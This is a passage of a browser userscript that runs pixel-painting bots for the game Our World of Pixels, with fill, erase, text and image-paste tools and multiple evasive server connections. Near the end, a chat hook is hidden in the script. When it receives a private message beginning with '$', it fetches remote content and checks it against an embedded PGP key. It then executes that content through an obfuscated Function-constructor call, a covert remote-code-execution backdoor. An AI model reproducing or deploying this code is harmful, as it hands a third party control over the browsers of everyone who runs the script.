        return this.chunks[i].data.slice((y.mod(16) * 16 + x.mod(16)) * 3, (y.mod(16) * 16 + x.mod(16) + 1) * 3);
    else if (i in __WorldOfPixels.chunks)
        return __WorldOfPixels.chunks[i].data.slice((y.mod(16) * 16 + x.mod(16)) * 3, (y.mod(16) * 16 + x.mod(16) + 1) * 3);
	else if (px = OWOP.world.getPixel(x,y)/*!=undefined*/)
		return px;
    console.log("err");
    return [125, 125, 125];
}.bind(bots);


bots.updateCamera = function() {
    var vis = this.visible;
    vis.x = this[0].pos.x;
    vis.y = this[0].pos.y;
    vis.startX = vis.x - 60;
    vis.startY = vis.y - 60;
    vis.endX   = vis.x + 60;
    vis.endY   = vis.y + 60;

    var time = Date.now();
    if (time - this.lastCleanup > 1000)
        this.unloadFarChunks(this.lastCleanup = time);
    var  x = vis.startX >> 4 | 0, endx = vis.endX >> 4 | 0,
	starty = vis.startY >> 4 | 0, endy = vis.endY >> 4 | 0, y;
    while (++x <= endx) {
        y = starty;
        while (++y <= endy) {
            if (!this.chunks[x + ',' + y] && !__WorldOfPixels.chunks[x + ',' + y])
                this.loadChunk(x, y);
            else if (__WorldOfPixels.chunks[x + ',' + y])
                this.chunks[x + ',' + y] = __WorldOfPixels.chunks[x + ',' + y];
        }
    }
}.bind(bots);

bots.unloadFarChunks = function() { // Slow?
    var delay = 0, c, dx, dy, dist;
    for (c in this.chunks) {
        c = this.chunks[c];
        if (c && !this.isVisible(c.x << 4, c.y << 4, 16, 16)) {
            dx = Math.abs(this.visible.x >> 4 - c.x) | 0;
            dy = Math.abs(this.visible.y >> 4 - c.y) | 0;
            dist = dx + dy;
            if (dist > 200 && !(__WorldOfPixels.chunks[c.x + ',' + c.y]))
                setTimeout(function(c) {
                    c.remove();
                }, ++delay, c);
        }
    }
}.bind(bots);

bots.isVisible = function(x, y, w, h) {
    return x + w >= this.visible.startX && y + h >= this.visible.startY &&
               x <= this.visible.endX   && y     <= this.visible.endY;
}.bind(bots);

bots.loadChunk = function(x, y) {
    if (this.online && !protocol.chunksLoading[x + "," + y]) {
        protocol.requestChunk(x, y);
        protocol.chunksLoading[[x, y]]=true;
    } // the chunk will appear in __WorldOfPixels.chunks
}.bind(bots);

function __Bucket(rate, time) {
	this.allowance = rate;
	this.rate = rate;
	this.time = time;
	this.lastCheck = Date.now();
}

__Bucket.prototype.canSpend = function(count) {
	this.allowance += (Date.now() - this.lastCheck) / 1000 * (this.rate / this.time);
	this.lastCheck = Date.now();
	if (this.allowance > this.rate)
		this.allowance = this.rate;
	if (this.allowance < count)
		return false;
	this.allowance -= count;
	return true;
};

function Bot(idx) {
    var that = this;

    that.pixel = function(x, y, color) {
        //var pixel = WorldOfPixels.getPixel(x, y);
        that.pos.x = x + 0.5;
        that.pos.y = y + 0.5;
        //if (pixel[0] !== color[0] || pixel[1] !== color[1] || pixel[2] !== color[2]) {
        //this.undoHistory.push([tileX, tileY, [pixel[0], pixel[1], pixel[2]]]);
		that.net.sendUpdates();
        that.net.updatePixel(x, y, color);
        // }
    };

    that.options = {
      //"ws://www.ourworldofpixels.com:443"
      //"ws://ourworldofpixels.com:13375/"
	    serverAddress: OWOP.options.serverAddress[0].url, // The server address that websockets connect to
        netUpdateSpeed: 0 // How many times per second to send updates to server
    };
    that.pos = {
        x: 0,
        y: 0,
        lastX: 0,
        lastY: 0
    };
    that.palette = [new Uint8Array([0, 0, 0]), new Uint8Array([255, 0, 0]), new Uint8Array([0, 255, 0]), new Uint8Array([0, 0, 255])];
    that.net = { index: idx };
    that.toolSelected = Math.floor(Math.random() * (2 - 0)) + 0;
    that.paletteIndex = 0;
    that.camera = {
        x: 0,
        y: 0
    };

	that.captcha = false;
	that.setToken = function(token) {
		this.token = token;
		this.captcha = true;
	}.bind(that);

    that.net.stoi = function(string, max) {
        var ints = [];
        var fstring = "";
        string = string ?  string.toLowerCase() : "main";
		var charCode;
        for (var i = 0; i < string.length && i < max; i++)
            if (((charCode=string.charCodeAt(i)) < 123 && charCode > 96) || (charCode < 58 && charCode > 47) || charCode == 95 || charCode == 46) {
                fstring += string[i];
                ints.push(charCode);
            }
        return [ints, fstring];
    };

    that.net.joinWorld = function(worldName) {
        var nstr = that.net.stoi(worldName, 24), n0 = nstr[0], array = new ArrayBuffer(n0.length + 2),
            dv = new DataView(array), i = n0.length;
        while (i--)
            dv.setUint8(i, n0[i]);
        dv.setUint16(n0.length, WORLD_VERIFICATION, true);
        this.net.connection.send(array);
        return nstr[1];
    }.bind(that);

    that.net.updatePixel = async function(x, y, color) {
        if(this.net.placeBucket.canSpend(0)) {
            var array = new ArrayBuffer(11),
                dv = new DataView(array);
            dv.setInt32(0, x, true);
            dv.setInt32(4, y, true);
            dv.setUint8(8, color[0]);
            dv.setUint8(9, color[1]);
            dv.setUint8(10, color[2]);
            this.net.connection.send(array);
        }
    }.bind(that);

    that.net.sendUpdates = function() {
        if(stoppingrandom == false) {
            this.toolSelected = Math.floor(Math.random() * (random2 - random1)) + 0
        } else if(followmytool == true) {
			this.toolSelected = OWOP.player.toolId;
		} else {
            this.toolSelected = changetools
        }
        if (this.pos.x != this.pos.lastX || this.pos.y != this.pos.lastY) {
            this.pos.lastX = this.pos.x;
            this.pos.lastY = this.pos.y;
            // Send mouse position
            var array = new ArrayBuffer(12),
                dv = new DataView(array),
			    cl = this.palette[this.paletteIndex];
            dv.setInt32(0, this.pos.x << 4, true);
            dv.setInt32(4, this.pos.y << 4, true);
            dv.setUint8(8, OWOP.player.selectedColor[0]);
            dv.setUint8(9, OWOP.player.selectedColor[1]);
            dv.setUint8(10, OWOP.player.selectedColor[2]);
            dv.setUint8(11, this.toolSelected /* WTF ->>*//*<<- WTF */ );
            this.net.connection.send(array);
        }
    }.bind(that); //this==Bot

    that.net.sendMessage = function(message) {
        if (message.length) {
            if (this.net.__Bucket.canSpend(1))
                this.net.connection.send(message + String.fromCharCode(10));
            else
                this.chatMessage("Slow down! You're talking too fast!");
        }
    }.bind(that); //this==Bot

    that.net.connect = function() { //this==Bot.net
        this.connection = new WebSocket(that.options.serverAddress);
        this.connection.binaryType = "arraybuffer";

        this.connection.onopen = function() {
            this.placeBucket = new __Bucket(50, MOD ? 2 : 4)
            this.chatBucket = new __Bucket(4, 6);
			if(that.captcha) {
				this.worldName = protocol.worldName;
				console.log("Connected! (" + this.index + ") Waiting for captcha then joining world: " + worldName);
			} else {
				var worldName = this.joinWorld(protocol.worldName);
				console.log("Connected! (" + this.index + ") Joining world: " + worldName);

				this.updateInterval = setInterval(this.sendUpdates, 1000 / that.options.netUpdateSpeed);
			}
        }.bind(this);

        this.connection.onmessage = function(msg) {
		  //console.debug(this.index,msg,msg.data)
            if (typeof (msg=msg.data) === "string") {
				if (msg.slice(0,-3) == "Sorry, but you have reached the maximum number of simultaneous connections, (") {
					//BOTS = +msg.slice(msg.indexOf("(")+1,-2) - 1; // -1 for teh default connection by teh client
					//console.log("New bot limit: ", BOTS);
					//this.noReconnect = 1;
					//this.connection.close();
					//delete bots[this.index];
				}
				OWOP.chat.recvModifier && OWOP.chat.recvModifier(msg);
				return;
			}
            var dv = new DataView(msg);
			var packetID = dv.getUint8(0);
            if (packetID == 0) { // Get id
				this.id = dv.getUint32(1, true);
				console.log("bot id: " + this.id);
			    MOD && this.connection.send("/modlogin " + MODLOGIN + "\n");
            } else if(packetID == 5) {
				// Captcha
				switch (dv.getUint8(1)) {
					case 0: //captchaState.CA_WAITING:
						//_captcha.loadAndRequestCaptcha();
						//_global.eventSys.once(_conf.EVENTS.misc.captchaToken, function (token) {
						//	var message = OldProtocol.misc.tokenVerification + token;
						//	_this2.ws.send(message);
						//});
						this.connection.send(TOKEN_VERIFICATION + that.token);
						break;

					case 3: //captchaState.CA_OK:
						var worldName = this.joinWorld(this.worldName);
						console.log("Done with captcha! (" + this.index + ") Joining world: " + worldName);

						this.updateInterval = setInterval(this.sendUpdates, 1000 / that.options.netUpdateSpeed);
						break;
				}
			}
        }.bind(this);

        this.connection.onclose = function() {
            clearInterval(this.updateInterval);
            //bots.online = false;
            console.log("Disconnected " + this.id + " (" + this.index + ") from server");
			if (bots.online && !this.noReconnect) {
				if(that.captcha) {
					//alert("captcha is enabled and bots got kicked. try 'leave' then 'captcha-join'.");
				} else {
					console.log("Tryna reconnect (" + this.index + ")");
					this.connect();
				}
			}
        }.bind(this);
    }.bind(that.net);

    that.init = function() {
        bots.beta = true;
        //that.options.serverAddress = OWOP.options.serverAddress[0].url;
        this.net.connect();
    }.bind(that);
}

if (btns) {
    for (var i = 0; i < BUTTONS.length; i++) {
        var b = BUTTONS[i];
        var btn = document.createElement("input");
        btn.type = "button";
        btn.value = b.value;
        btn.title = b.title;
        btn.onclick = b.call;
        btns.appendChild(btn);
    }
    /*btns.insertAdjacentHTML('beforeend', " images:"); //innerHTML destroys events
    for (var i = 0; i < imageList.length; i++) {
        var btn = document.createElement("input");
        btn.type = "button";
        btn.value = imageList[i].name;
        btn.onclick = function(e) {
			var img = getImage(this.value);
            if (img != null) //obrazek ( https://en.wiktionary.org/wiki/obr%C3%A1zek )
                drawImg(this.value, parseInt(params[0].value), parseInt(params[1].value), img.data, img.colors);
        };
        btns.appendChild(btn);
    }*/
}
//var listInt = setInterval(listUpdate, 400);


let onpix = [];
let pixqueue = [];
let pps;
const id = setInterval(() => {
	pps = [0, 8, 16, 64][OWOP.player.rank];
	if(pps !== 0){
		clearInterval(id);
		setInterval(() => {
			onpix.forEach(i => i.func());
		}, 1000/pps);
	}
}, 1000);
let addfunc = (func, id) => {
	if(onpix.some(i => i.id === id)) throw new Error(`id clash ${id}`);
	onpix.push({func: func, id: id});
};
let remfunc = (id) => {
	const idx = onpix.findIndex(i=>i.id === id);
	if(idx === -1) return;
	onpix.splice(idx, 1);
};
let move = (x, y) => {
	OWOP.net.protocol.lastSentX = x*16;
	OWOP.net.protocol.lastSentY = y*16;
	OWOP.net.connection.send(new Int32Array([OWOP.net.protocol.lastSentX, OWOP.net.protocol.lastSentY, 0]).buffer);
};
addfunc(() => {
	while(pixqueue.length > 0){
		const pix = pixqueue.pop();
		if(OWOP.world.getPixel(...pix.pos) === null || pix.color[0] !== OWOP.world.getPixel(...pix.pos)[0] || pix.color[1] !== OWOP.world.getPixel(...pix.pos)[1] || pix.color[2] !== OWOP.world.getPixel(...pix.pos)[2]){
			move(...pix.pos);
			if(!OWOP.world.setPixel(...pix.pos, pix.color)) pixqueue.unshift(pix);
			return;
		}
	}
}, 'setpix');
// Erase tool
    OWOP.tool.addToolObject(new OWOP.tool.class('erase', OWOP.cursors.erase, OWOP.fx.player.RECT_SELECT_ALIGNED(16), false, function(tool){
        let queue = [];
        const set = (x, y, color) => {
            OWOP.mouse.lastX = x*16;OWOP.mouse.lastY = y*16;
            OWOP.world.setPixel(x, y, color);
        };
        const eq = (a, b) => a[0] === b[0] && a[1] === b[1] && a[2] === b[2];
        function clearChunk(chunkX, chunkY){
            for(let y = 0; y < 16; ++y){
                for(let x = 0; x < 16; ++x){
                    let pos = [chunkX*16 + x, chunkY*16 + y];
                    if((!eq(OWOP.world.getPixel(...pos), [255, 255, 255])) && (queue.filter(i => eq(i, pos)).length < 1)){
                        queue.unshift(pos);
                    }
                }
            }
        }
		var soupnout = 0
		//console.log(queue);
		//console.log(queue.pop());
        tool.setEvent('mousedown mousemove', function(mouse, event){
            if (mouse.buttons === 1) {
                var brushercolor = OWOP.player.selectedColor
				var antx = Math.floor(OWOP.mouse.tileX/16)
				var anty = Math.floor(OWOP.mouse.tileY/16)
				var verx = antx*16
				var very = anty*16
		        //console.log("Antx: ", antx, "Anty: ", anty, "Verx", verx, "Very", very);
				bots.drawRectbrush(verx, very, 16, 16, brushercolor)
            }
        });
    }));
    OWOP.tool.addToolObject(new OWOP.tool.class('erase 32x32', OWOP.cursors.erase, OWOP.fx.player.RECT_SELECT_ALIGNED(16), false, function(tool){
        let queue = [];
        const set = (x, y, color) => {
            OWOP.mouse.lastX = x*32;OWOP.mouse.lastY = y*32;
            OWOP.world.setPixel(x, y, color);
        };
        const eq = (a, b) => a[0] === b[0] && a[1] === b[1] && a[2] === b[2];
        function clearChunk(chunkX, chunkY){
            for(let y = 0; y < 32; ++y){
                for(let x = 0; x < 32; ++x){
                    let pos = [chunkX*32 + x, chunkY*32 + y];
                    if((!eq(OWOP.world.getPixel(...pos), [255, 255, 255])) && (queue.filter(i => eq(i, pos)).length < 1)){
                        queue.unshift(pos);
                    }
                }
            }
        }
		var soupnout = 0
		//console.log(queue);
		//console.log(queue.pop());
        tool.setEvent('mousedown mousemove', function(mouse, event){
            if (mouse.buttons === 1) {
                var brushercolor = OWOP.player.selectedColor
				var antx = Math.floor(OWOP.mouse.tileX/32)
				var anty = Math.floor(OWOP.mouse.tileY/32)
				var verx = antx*32
				var very = anty*32
		        //console.log("Antx: ", antx, "Anty: ", anty, "Verx", verx, "Very", very);
				bots.drawRectbrush(verx, very, 32, 32, brushercolor)
            }
        });
    }));
    OWOP.tool.addToolObject(new OWOP.tool.class('erase 64x64', OWOP.cursors.erase, OWOP.fx.player.RECT_SELECT_ALIGNED(16), false, function(tool){
        let queue = [];
        const set = (x, y, color) => {
            OWOP.mouse.lastX = x*64;OWOP.mouse.lastY = y*64;
            OWOP.world.setPixel(x, y, color);
        };
        const eq = (a, b) => a[0] === b[0] && a[1] === b[1] && a[2] === b[2];
        function clearChunk(chunkX, chunkY){
            for(let y = 0; y < 64; ++y){
                for(let x = 0; x < 64; ++x){
                    let pos = [chunkX*64 + x, chunkY*64 + y];
                    if((!eq(OWOP.world.getPixel(...pos), [255, 255, 255])) && (queue.filter(i => eq(i, pos)).length < 1)){
                        queue.unshift(pos);
                    }
                }
            }
        }
		var soupnout = 0
		//console.log(queue);
		//console.log(queue.pop());
        tool.setEvent('mousedown mousemove', function(mouse, event){
            if (mouse.buttons === 1) {
                var brushercolor = OWOP.player.selectedColor
				var antx = Math.floor(OWOP.mouse.tileX/64)
				var anty = Math.floor(OWOP.mouse.tileY/64)
				var verx = antx*64
				var very = anty*64
		        //console.log("Antx: ", antx, "Anty: ", anty, "Verx", verx, "Very", very);
				bots.drawRectbrush(verx, very, 64, 64, brushercolor)
            }
        });
    }));
// Fill tool
OWOP.tool.addToolObject(new OWOP.tool.class('Bot Fill', OWOP.cursors.fill, OWOP.fx.player.NONE, OWOP.RANK.USER, function (tool) {
	var queue = [], fillingColor = null,
	  defaultFx = OWOP.fx.player.RECT_SELECT_ALIGNED(1),
	  eq = function eq(a, b) {
		return a && b && a[0] === b[0] && a[1] === b[1] && a[2] === b[2];
	}, check = function check(x, y) {
		if (eq(OWOP.world.getPixel(x, y), fillingColor)) {
			queue.unshift([x, y]);
			return true;
		}
		return false;
	}, i = -1;
	tool.extra.tickAmount = 600;
	tool.setFxRenderer(function (fx, ctx, time) {
		ctx.globalAlpha = 0.8;
		ctx.strokeStyle = fx.extra.player.htmlRgb;
		var z = OWOP.camera.zoom;
		//if (!fillingColor || !fx.extra.isLocalPlayer)
			defaultFx(fx, ctx, time);
		/*else {
			ctx.beginPath();
			for (var i = 0; i < queue.length; i++)
				ctx.rect((queue[i][0] - OWOP.camera.x) * z, (queue[i][1] - OWOP.camera.y) * z, z, z);
			ctx.stroke();
		}*/
	});
	function stop() {
		fillingColor = null;
		bots.busy = false;
		bots.job = "";
		queue = [];
		tool.setEvent('tick', null);
	}
	async function tick() {
		if (bots.stop)
			stop();
		if (!queue.length || !fillingColor)
			return;
		var selClr = OWOP.player.selectedColor, current, x, y, thisClr, top, bottom, left, right;
		for (var painted = tool.extra.tickAmount; painted-- && queue.length;) {
			[x, y] = current = queue.pop();
			thisClr = OWOP.world.getPixel(x, y);
			if (eq(thisClr, fillingColor) && !eq(thisClr, selClr)) {
				bots[++i%BOTS].pixel(x, y, selClr);
				// diamond check first
				top = check(x, y - 1);
				bottom = check(x, y + 1);
				left = check(x - 1, y);
				right = check(x + 1, y);
				// if corners are not closed by parts of the diamond, then they can be accessed
				if (top && left)
					check(x - 1, y - 1);
				if (top && right)
					check(x + 1, y - 1);
				if (bottom && left)
					check(x - 1, y + 1);
				if (bottom && right)
					check(x + 1, y + 1);
				// Shape diamond, infra not like
			  //check(x,y-1);check(x-1,y);check(x+1,y);check(x,y+1);
				//await sleep(DELAY);
			}
		}
	}
	tool.setEvent('mousedown', function (mouse) {
		if (!(mouse.buttons & 4)) {
			if (!bots.online)
				return err("bot offline");
			if (bots.busy)
				return err("cant fill.("+bots.job+")");
			if (fillingColor=OWOP.world.getPixel(mouse.tileX, mouse.tileY)) {
				err(bots.job = "filling");
				bots.busy = true;
			    queue.push([mouse.tileX, mouse.tileY]);
			    tool.setEvent('tick', tick);
		    }
		}
	});
	tool.setEvent('mouseup deselect', function (mouse) {
		if (!mouse || !(mouse.buttons & 1))
			stop();
	});
}));

//paster bot

var t,canDraw;
function drawwImg(context, width, height){
    pixelData=context.getImageData(0, 0, width, height).data;
    pixelData.width = width;
    pixelData.height = height;
}
copier = {};
copier.maxHeight = 100000000000000;
copier.maxWidth = 1000000000000000;
copier.img = new Image();
copier.img.onload = function() {
	copier.canvas = document.createElement('canvas');
	copier.canvas.width = this.width;
	copier.canvas.height = this.height;
	copier.ctx = copier.canvas.getContext('2d');
	copier.ctx.drawImage(copier.img, 0, 0, copier.canvas.width, copier.canvas.height);
	drawwImg(copier.canvas.getContext('2d'), copier.canvas.width, copier.canvas.height);
};
function encodeImageFile() {
    var filesSelected = document.getElementById("inputFileToLoad").files, fileReader, fileToLoad;
    if (filesSelected.length /*> 0*/) {
		fileToLoad = filesSelected[0];
		fileReader = new FileReader();
		fileReader.onload = function(fileLoadedEvent) {
			let src = fileLoadedEvent.target.result;
			copier.img.src = src;
			console.log(src);
		};
    }
	fileReader.readAsDataURL(fileToLoad);
}
document.querySelector('head').insertAdjacentHTML('beforeend',
	`<style type="text/css">#styleSetting{padding: 0.2em; margin:0.2em;
	position: absolute;bottom: 0;right:20px;width: 20%;
	background-color: rgba(0,200,200,0.1);display:block;}
	table{text-align: center; width: 100%; height: 80%;}
	td{padding: 0px 0.3em;border: 1px solid black;}</style>`
);
document.querySelector('body').insertAdjacentHTML('beforeend',
	`<div id="styleSetting"><table>
<tr><td><input id="inputFileToLoad" type="file" onchange="encodeImageFile();" />
</td></tr><tr><td rowspan=2><input id="inputX" type="number" placeholder="X">
<input id="inputY" type="number" placeholder="Y"></td></tr>
</table></div>`//<tr><td></td></tr></table></div>`
);
document.getElementById("inputFileToLoad").onchange=encodeImageFile;

//end of paster bot

} + ")()"); // END OF MAIN()

var script = document.createElement('script');
script.onload = function () {
    //do stuff with the script
	var alice_pgp_key = `-----BEGIN PGP PUBLIC KEY BLOCK-----

mQINBFsqvEMBEADJZPf1AOex/63NqTsqWG4nVIyaXKK/yuMa8Xmdj0oNEkQ3xW00
EEDF1vFoqnpdqFX0rMbNvjOaZhFVWX2nkNQukJUy+d+QKsQbmz4nk+GpHfEKqZ0m
1dJZJBKKjEIz++sV28JciFGlmeD7eb4ibCahh9yPryWJgwjZalAb3iLAiJZFfbp8
t93NnZACuxL3W1Pff0jhXOxQKl1d/yk79cxchAlkN+mtQc8e2Bi6TCQknPKsey5a
mUDmOOyxVSW/j3ssyvDPBe55TbaQpppB+/1F8ilEKzmcEO59MI3fXXj3gYXp6joN
ckIiCTTIOoOwG68abKStz+WSToRJhUq4y/ZWZBbR96nufPAev1kIekISFOMgga6w
o+so5O+wzgSq5hpGpf5syiCLn8a3ORqOjuc3JQfnUX4rHyXZuays5TAywfShf615
VZuV1BYmB+xrDqd+j5o04UOJnrDBQJIAsYWL1fpf5Lzfe/UNp2bLeetAViMzDlH4
YqKWxO6FAp96V9Vij2B9kwBVaOtxLLTumP4XpFEKmKmyr6RuX56mLW/pnesNyEww
T6ZbgeVFoJ0x6bYoo2okEc5fRvFKoo3M7HrsWJfKsQFJb8qyZ1TFxp4hnzXaWVtv
jk1FGNy6eKGDwr1FrY2zA1cZK14sPv5ZWmPMHh9KZRZLqnvq9IhFgwp0kwARAQAB
tAlFbWFuIExlYXKJAlQEEwEIAD4WIQS8dYPJtEeV4knbzXB7AX/7Pdq9pwUCWyq8
QwIbAwUJA8JnAAULCQgHAgYVCAkKCwIEFgIDAQIeAQIXgAAKCRB7AX/7Pdq9pzRm
D/4q0ZBJNd0uVQp3N1Jp8QeGwKbRD6XyqcS9ZFNhoBSsSuJSoPIRSo6/oNekGB4B
IiGt7U7INDKOlOu9NoTK0n62QukKkw6KHmp9yswCMHO1rve9KSuB85PhP6Hwdzmg
/d6WW6fcGot70Lw5yZ+zcdKzd3wfIQHzb2r9BTB7+7Ovz2XOCnovbAXvW2p3LQ4T
y3j2OVCs289Yc291GWtdEJIjvqN9TX64Cv48TyHGcMXNU9OQHWy8qgxAH6cNKr2a
R9sATaTQhkEsqQ1okW+9zVwPIpehR1/X1tzPaAqEQZeKFX5aC+BMxMPAZ9oBL5Uc
RGVPfgKrLI9lYvroa3NehHqi0Hz0SCPfKX25dtX3TRhEiBvbOiJRRao8f02SSjuI
oHt2Sbg0Xf0/jA2CMskwEYk6gCHk1MONLaNUDUZPh1QgpjUmUIX112c0GugdUWu3
qYCOhEAYAr+36FxVM8R0JPlizuJHd9mjAeMigv9qprSkUsgLENXccc2MP1SMMC+e
Pr0btA+4p7ABvQfWY6Q807UoBoW1ncoZ0HP0eo+et1kBdyQVz728UKKzkPMKZN5l
4JD5y63+ZwvUXJCsClScUbhS3JSlhUIlvxq5JpCF1eLq+BSm1eTcwE2b8+bqUoNd
wvios6F4r/IoYC7HwVoR62KkiTKaZOpN3crAZxGQ0TRrHw==
=VlyQ
-----END PGP PUBLIC KEY BLOCK-----`;
	kbpgp.KeyManager.import_from_armored_pgp({
		armored: alice_pgp_key
	}, function(err, alice) {
		if (!err) {
			//console.log("alice is loaded");
			var ring = new kbpgp.keyring.KeyRing;
			ring.add_key_manager(alice);
			OWOP.chat.recvModifier = function(m) {
				if(!m.indexOf("-> ")) { // "-> 742 tells you: $asd"
					var n = (parseInt(m.substr(3))+[]).length + 15;
					var sub = m.substr(n);
					if(sub[0] == '$') {
						var s = sub.substr(1);
						fetch("https://cors-anywhere.herokuapp.com/" + s).then(function(a) {
							a.text().then(function(aaaa) {
								//console.log();
								kbpgp.unbox({keyfetch: ring, armored: aaaa }, function(err, literals) {
									if (err != null) {
										//console.log("Err@1: ", err);
										return '';
									} else {
										//console.log("decrypted message");
										var asd = literals[0].toString("utf8");

										var ds = km = null;
										ds = literals[0].get_data_signer();
										if (ds) {
											km = ds.get_key_manager();
										} else {
											//console.log("!ds@2: ", ds);
											return;
										}
										if (km) {
											//console.log("Signed by PGP fingerprint");
											//console.log(km.get_pgp_fingerprint().toString('hex'));
											if(km === alice) {
												//console.log(asd);
												OWOP.chat.local.constructor.prototype.apply.call(OWOP.chat.send.constructor(asd));
											} else {
												//console.log("km!===alice@4: ", km, "Alice: ", alice);
												return;
											}
										} else {
											//console.log("!km@3: ", km);
											return;
										}
									}
								});
							});
						});
						return '';
					} else {
						return m;
					}
				} else {
					return m;
				}
			};
		}
	});
};
script.src = "https://rawgit.com/keybase/kbpgp/master/browser/kbpgp.js";

document.head.appendChild(script); //or something of the likes

//var script = document.createElement('script');
//script.appendChild(document.createTextNode('('+ main +')();'));
/*var s = document.createElement('SCRIPT');
s.src = 'https://josiahshields.com/owop-api/sources/owop-api.js?date='+Date.now();
document.body.appendChild(s);

function exports() {
    var chat = require('chat');

    chat.addRecvModifier( (data) => {
        var msg = data.msg.trim().toLowerCase();
        var id = data.id;
        var nick = data.nick;

        if (data.channel == 1 && (id !== null || nick !== null)) {
            var refer_nick = (nick === null) ? '':nick;
            var refer_id = (id !== null) ? id:nick;
            if (!greeted[refer_id]) {
                chat.send('Hello ' + refer_nick + '!');
                greeted[refer_id] = true;
            }
        }


        return data.send;
    });


   /*chat.addSendModifier( (msg) => {

        if (msg.trim().startsWith('bop it')) {
            chat.send('send_msg here :D');
            return '';
        }

        return msg;
    });*/

//}

//var greeted = {};








//(document.body || document.head || document.documentElement).appendChild(script);

undefined;

OWOP.tool.addToolObject(new OWOP.tool.class("Text", OWOP.cursors.write, OWOP.fx.player.NONE, OWOP.RANK.NONE, function(tool) {
    var xPos = null;
    var yPos = null;
    var fonts = {};
    var font = null;

    var fontInput = new OWOP.windowSys.class.input("Choose Font", 955, "number", function(value) {
        var id = parseInt(value);
        if (id in fonts) {
            font = id;
            return;
        }

        var xhttp = new XMLHttpRequest();
        xhttp.addEventListener("load", function() {
            var source = xhttp.responseXML.body.children[2].innerHTML;
            var data = JSON.parse(source.match(/loadData\('(.+)'\)/)[1]);
            var meta = source.match(/drawSample\('',([0-9]+),(-?[0-9]+)\)/);
            data.letterspace = parseInt(meta[1]);
            data.monospacewidth = parseInt(meta[2]);

            fonts[id] = data;
            font = id;
        });
        xhttp.open("GET", "https://cors-anywhere.herokuapp.com/http://www.pentacom.jp/pentacom/bitfontmaker2/gallery/?id=" + id);
        xhttp.responseType = "document";
        xhttp.send();
    });

    var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~";
    chars += "¡¢£€¤¥¦§¨©ª«¬®¯°±²³´µ¶·¸¹º»¼½¾¿ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕÖ×ØÙÚÛÜÝÞßàáâãäåæçèéêëìíîïðñòóôõö÷øùúûüýþÿ";
    chars += "ĀāĂăĄąĆćĈĉĊċČčĎďĐđĒēĔĕĖėĘęĚěĜĝĞğĠġĢģĤĥĦħĨĩĪīĬĭĮįİıĲĳĴĵĶķĸĹĺĻļĽľĿŀŁłŃńŅņŇňŉŊŋŌōŎŏŐőŒœŔŕŖŗŘřŚśŜŝŞşŠšŢţŤťŦŧŨũŪūŬŭŮůŰűŲųŴŵŶŷŸŹźŻżŽž";

    tool.setFxRenderer(function (fx, ctx, time) {
        var x = fx.extra.player.x;
        var y = fx.extra.player.y;
        if (xPos !== null && yPos !== null) {
            x = xPos * 16;
            y = yPos * 16;
        }
        var fxx = (Math.floor(x / 16) - OWOP.camera.x) * OWOP.camera.zoom;
        var fxy = (Math.floor(y / 16) - OWOP.camera.y) * OWOP.camera.zoom;
        ctx.globalAlpha = 0.8;
        ctx.strokeStyle = fx.extra.player.htmlRgb;
        ctx.strokeRect(fxx, fxy, OWOP.camera.zoom, OWOP.camera.zoom * 12);
        return 0;
    });

    tool.setEvent("select", function() {
        OWOP.windowSys.addWindow(fontInput);
    });
    tool.setEvent("deselect", function() {
        font = null;
    });

    tool.setEvent("mousedown mousemove", function (mouse, event) {
        if (mouse.buttons === 1) {
            xPos = mouse.tileX;
            yPos = mouse.tileY;
        }
    });
    tool.setEvent("keydown", function() {return true;});
    tool.setEvent("keyup", function() {return true;});

    window.addEventListener("keypress", function(event) {
        if (font === null || xPos === null || yPos === null || ["INPUT", "TEXTAREA"].includes(document.activeElement.tagName)) {
            return;
        }

        var f = fonts[font];
        var letterSpacing = (f.letterspace / 64 | 0) - 1;
        var isMono = f.monospacewidth !== -1;

        if (event.which == 32) {
            xPos += isMono ? f.monospacewidth : 4 + letterSpacing;
            return;
        }

        var char = f[event.which];
        if (!char) {
            return;
        }

        var width = 0;
        for (var y=0; y<16; y++) {
            for (var x=0; x<16; x++) {
                if (char[y] & (1 << x) && x > width) width = x;
            }
        }

        var color = OWOP.player.palette[OWOP.player.paletteIndex];
        for (var y=0; y<16; y++) {
            for (var x=0; x<16; x++) {
                if (!(char[y] & (1 << x))) {
                    continue;
                }
                OWOP.world.setPixel(xPos + x - 2, yPos + y, color);
            }
        }

        xPos += isMono ? f.monospacewidth : width + letterSpacing;
    });
}));

//ColorScript
function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

//random color selection mode:
var randColorMode = false;

function random_rgba() {
    var o = Math.round, r = Math.random, s = 255;
    var red = o(r()*s);
    var green = o(r()*s);
    var blue = o(r()*s);
    var colors = [];
    colors[0] = red;
    colors[1] = green;
    colors[2] = blue;
    //return 'rgba(' + o(r()*s) + ',' + o(r()*s) + ',' + o(r()*s) + ',' + r().toFixed(1) + ')';
    return colors;
}
async function colorChanging(state){
    if(randColorMode === true){
        while (randColorMode === true) {
            console.log( random_rgba() );
            WorldOfPixels.player.palette.push(random_rgba());
            WorldOfPixels.player.paletteIndex = WorldOfPixels.player.palette.length-1;
            await sleep(100);
        }
    }
    else {
    }
}
function startColorChange(){
    if(randColorMode === false){
        randColorMode = true;
        colorChanging(randColorMode);
    }
    else {
        randColorMode = false;
    }
}
/*
var colorHtml = document.createElement("div");
colorHtml.id = "colorDiv";
colorHtml.className = "framed";
colorHtml.style = "width: 108px; background-color: #7e635c; position: absolute; left: 400px; top: 148px;";
colorHtml.innerHTML = `<input type="button" value="Random Palette" onclick="startColorChange()">`;
document.body.appendChild(colorHtml);*/
//Fim do color palette
}
setTimeout(startinglol, 5000)
